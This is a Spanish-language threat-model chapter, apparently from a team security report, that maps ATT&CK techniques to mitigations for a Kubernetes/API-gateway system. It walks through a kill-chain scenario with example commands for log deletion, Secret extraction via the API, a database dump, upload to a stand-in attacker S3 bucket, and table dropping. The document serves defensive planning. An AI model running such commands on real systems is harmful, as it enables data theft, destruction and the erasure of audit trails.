# 06. Mapa de Ataque (ATT&CK)

**Equipo:** Juan Lamolle, Serafín González, Fernando Rodríguez  
**Fecha:** Mayo 2026

---

### 6.1 Técnicas Identificadas

| ID | Técnica | Tactic | Mitigación |
|----|---------|--------|------------|
| T1190 | Exploit Public-Facing Application | Initial Access | WAF, Input validation |
| T1078 | Valid Accounts | Initial Access | MFA, Strong passwords |
| T1133 | External Remote Services | Initial Access | VPN, Network segmentation |
| T1609 | Container Administration Command | Execution | RBAC, Admission controllers |
| T1610 | Deploy Container | Execution | Image signing, Registry auth |
| T1136 | Create Account | Persistence | Account auditing |
| T1098 | Account Manipulation | Persistence | Privileged account monitoring |
| T1525 | Implant Internal Image | Persistence | Image scanning, Signing |
| T1611 | Escape to Host | Privilege Escal. | Security contexts, AppArmor |
| T1078.004 | Cloud Accounts | Privilege Escal. | IAM policies, Least privilege |
| T1068 | Exploitation for Privilege Escal. | Privilege Escal. | Patching, Kernel hardening |
| T1562.001 | Disable or Modify Tools | Defense Evasion | File integrity monitoring |
| T1070.004 | File Deletion | Defense Evasion | Immutable logs, Write-once storage |
| T1112 | Modify Registry | Defense Evasion | Configuration management |
| T1552.001 | Credentials in Files | Credential Access | Secrets management, Vault |
| T1552.007 | Container API | Credential Access | RBAC, Network policies |
| T1606 | Forge Web Credentials | Credential Access | Strong signing, Secret rotation |
| T1613 | Container and Resource Discovery | Discovery | Network segmentation, RBAC |
| T1046 | Network Service Scanning | Discovery | Firewall, IDS/IPS |
| T1087 | Account Discovery | Discovery | Least privilege |
| T1021 | Remote Services | Lateral Movement | Network segmentation, MFA |
| T1534 | Internal Spearphishing | Lateral Movement | Email security, Training |
| T1530 | Data from Cloud Storage Object | Collection | Access controls, Encryption |
| T1005 | Data from Local System | Collection | DLP, Encryption |
| T1537 | Transfer Data to Cloud Account | Exfiltration | DLP, Network monitoring |
| T1048 | Exfiltration Over Alternative Protocol | Exfiltration | DNS monitoring, Firewall |
| T1499 | Endpoint Denial of Service | Impact | Rate limiting, DDoS protection |
| T1485 | Data Destruction | Impact | Backups, Immutable storage |
| T1486 | Data Encrypted for Impact | Impact | Backups, EDR |

### 6.2 Visualización - Kill Chain Completo

**Escenario:** Compromiso desde API Gateway hasta exfiltración de datos

```
┌────────────────────────────────────────────────────────────────┐
│ FASE 1: Initial Access                                         │
│ [T1190] Exploit Public-Facing Application                      │
│ Atacante explota CVE en Kong API Gateway sin patchear          │
│ Vector: Request malicioso a endpoint vulnerable                │
└────────────────────────────────────────────────────────────────┘
                              ↓
┌────────────────────────────────────────────────────────────────┐
│ FASE 2: Execution                                              │
│ [T1609] Container Administration Command                       │
│ Ejecuta comando en el container de Kong                        │
│ Vector: kubectl exec via vulnerabilidad                        │
└────────────────────────────────────────────────────────────────┘
                              ↓
┌────────────────────────────────────────────────────────────────┐
│ FASE 3: Persistence                                            │
│ [T1525] Implant Internal Image                                 │
│ Modifica imagen Docker en registry con backdoor                │
│ Vector: Credenciales de registry en ConfigMap                  │
└────────────────────────────────────────────────────────────────┘
                              ↓
┌────────────────────────────────────────────────────────────────┐
│ FASE 4: Privilege Escalation                                   │
│ [T1611] Escape to Host                                         │
│ Container escape vía CVE-2019-5736 (runC)                      │
│ Vector: Sobrescribe binario runC, obtiene root en nodo         │
└────────────────────────────────────────────────────────────────┘
                              ↓
┌────────────────────────────────────────────────────────────────┐
│ FASE 5: Defense Evasion                                        │
│ [T1070.004] File Deletion                                      │
│ Elimina logs de kubectl audit en nodo host                     │
│ Vector: rm -rf /var/log/kubernetes/audit/*                     │
└────────────────────────────────────────────────────────────────┘
                              ↓
┌────────────────────────────────────────────────────────────────┐
│ FASE 6: Credential Access                                      │
│ [T1552.007] Container API                                      │
│ Extrae Kubernetes Secrets vía API                              │
│ Vector: curl -k https://kubernetes.default/api/v1/namespaces/  │
│         default/secrets -H "Authorization: Bearer $SA_TOKEN"   │
└────────────────────────────────────────────────────────────────┘
                              ↓
┌────────────────────────────────────────────────────────────────┐
│ FASE 7: Discovery                                              │
│ [T1613] Container and Resource Discovery                       │
│ Enumera todos los pods y servicios del cluster                 │
│ Vector: kubectl get pods --all-namespaces                      │
└────────────────────────────────────────────────────────────────┘
                              ↓
┌────────────────────────────────────────────────────────────────┐
│ FASE 8: Lateral Movement                                       │
│ [T1021] Remote Services                                        │
│ Accede a PostgreSQL usando credenciales extraídas              │
│ Vector: psql -h postgres.default.svc -U admin -p $DB_PASSWORD  │
└────────────────────────────────────────────────────────────────┘
                              ↓
┌────────────────────────────────────────────────────────────────┐
│ FASE 9: Collection                                             │
│ [T1005] Data from Local System                                 │
│ Dump completo de base de datos PostgreSQL                      │
│ Vector: pg_dump -U admin production > /tmp/db_dump.sql         │
└────────────────────────────────────────────────────────────────┘
                              ↓
┌────────────────────────────────────────────────────────────────┐
│ FASE 10: Exfiltration                                          │
│ [T1537] Transfer Data to Cloud Account                         │
│ Sube dump a bucket S3 del atacante                             │
│ Vector: aws s3 cp /tmp/db_dump.sql s3://attacker-bucket/       │
└────────────────────────────────────────────────────────────────┘
                              ↓
┌────────────────────────────────────────────────────────────────┐
│ FASE 11: Impact                                                │
│ [T1485] Data Destruction                                       │
│ Elimina tablas para cubrir rastros                             │
│ Vector: DROP TABLE users CASCADE;                              │
└────────────────────────────────────────────────────────────────┘
```

**TIEMPO TOTAL DEL ATAQUE:** ~3-6 horas (si no hay detección)

**PUNTOS DE DETECCIÓN CRÍTICOS:**
- **Fase 1:** WAF debe bloquear exploit
- **Fase 4:** Falco debe detectar container escape
- **Fase 6:** Audit logs de K8s API deben alertar acceso a Secrets
- **Fase 9:** Database activity monitoring debe detectar pg_dump anómalo

---

[← Anterior: Análisis de Riesgos - Metodología DREAD](05-priorizacion-dread.md) | [Siguiente: Plan de Mitigación →](07-plan-mitigacion.md)